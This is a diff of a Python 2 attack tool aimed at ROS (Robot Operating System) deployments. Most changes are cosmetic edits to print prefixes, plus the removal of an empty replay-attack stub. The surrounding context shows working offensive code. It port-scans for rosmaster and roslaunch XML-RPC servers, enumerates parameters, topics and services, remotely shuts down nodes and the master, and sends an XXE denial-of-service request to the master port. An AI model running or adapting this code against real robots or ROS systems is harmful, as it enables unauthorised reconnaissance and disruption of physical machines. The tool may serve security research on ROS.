@@ -19,11 +19,11 @@ except ImportError:
 
 class Attack:
 	def __init__(self):
-		print "[*]attack class"
+		print ADDED+"attack class"
 
 	def PortScanning(self, ip='127.0.0.1'):
 		#stage1 roscore open check
-		print "[*]port scanning"
+		print ADDED+"port scanning"
 		self.master_port = 11311
 		first_find = True
 		while True:
@@ -39,7 +39,7 @@ class Attack:
 					self.master_port += 1
 				continue
 
-		print "[*]rosmaster XmlRpcServer pid: %d, port: %d" %(rosmaster_pid, self.master_port)
+		print NOTIFY+"rosmaster XmlRpcServer pid: %d, port: %d" %(rosmaster_pid, self.master_port)
 		
 		#stage2 roslaunch xmlrpc server port checking
 		self.launch_port = 10000
@@ -52,46 +52,43 @@ class Attack:
 				self.launch_port += 1
 				continue
 
-		print "[*]roslaunch XmlRpcServer pid: %d, port: %d" %(roslaunch_pid, self.launch_port)
+		print NOTIFY+"roslaunch XmlRpcServer pid: %d, port: %d" %(roslaunch_pid, self.launch_port)
 
 	def FingerPrinting(self):
-		print "[*]finger printing"
+		print ADDED+"finger printing"
 		#####stage 1 fingerprinting from rosmaster xmlrpcServer
 		self.GetParameter()
 		#####stage 2 Get publishers, subscribers, services
 		self.GetSystemState()
 
 	def GetParameter(self):
-		print "[*]---Parameter Names---"
+		print NOTIFY+"---Parameter Names---"
 		for i, param in enumerate(self.proxy.getParamNames("")[2]):
 			print "%d: %s" %(i, param)
 
 	def GetSystemState(self):
-		print "[*]---SystemState---"
+		print NOTIFY+"---SystemState---"
 		publishers, subscribers, services = self.proxy.getSystemState("")[2]
-		print "[*]publishers"
+		print NOTIFY+"publishers"
 		for i, topic in enumerate(publishers):
 			print "[%d]topic: %s" %(i,topic[0])
 			print "->publisher"
 			for topicPublisher in topic[1]:
 				print topicPublisher
 
-		print "[*]subscribers"
+		print NOTIFY+"subscribers"
 		for i, topic in enumerate(subscribers):
 			print "[%d]topic: %s" %(i, topic[0])
 			print "->TopicSubscriber"
 			for topicSubscriber in topic[1]:
 				print topicSubscriber
 
-		print "[*]service"
+		print NOTIFY+"service"
 		for i, service in enumerate(services):
 			print "[%d]service: %s" %(i, service[0])
 			print "->serviceProvider"
 			for serviceProvider in topic[1]:
 				print serviceProvider
-
-	def ReplayAttack(self):
-		print "[*]replay attack"
 
 	def shutdown(self):
 		#stage1 turn off nodes
@@ -110,7 +107,7 @@ class Attack:
 			NodeProxy.shutdown("")
 
 		#stage2 turn off master
-		print "[*]turn off ros"
+		print NOTIFY+"turn off ros"
 		self.proxy.shutdown("","")
 
 	def XxeDosAttack(self, ip="127.0.0.1"):
@@ -138,7 +135,9 @@ class Attack:
 		'User-Agent': 'XMLRPC++ 0.7',
 		'Content-Type': 'text/xml',
 		'Content-Length': str(len(xml))} # set what your server accepts
-
+		
+		print NOTIFY+"Executed DOS using XXE..."
+		
 		res = requests.post('http://'+ip+':'+str(self.master_port), data=xml, headers=headers)
 		print res.content
 
